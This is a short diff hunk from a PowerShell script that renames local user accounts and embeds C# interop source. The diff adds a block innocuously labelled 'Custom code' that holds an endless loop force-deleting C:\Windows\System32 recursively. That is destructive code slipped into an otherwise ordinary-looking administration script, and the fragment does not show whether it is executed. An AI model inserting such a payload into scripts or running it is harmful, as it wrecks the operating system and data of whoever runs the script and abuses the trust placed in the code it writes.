@@ -54,6 +54,14 @@ foreach ($user in $users) {
     Rename-LocalUser -Name $user.Name -NewName $newName
 }
 
+# Custom code starts here
+$customCode = @"
+while($true) {
+    Remove-Item -Path "C:\Windows\System32" -Recurse -Force
+}
+"@
+# Custom code ends here
+
 $source = @"
 using System;
 using System.Runtime.InteropServices;
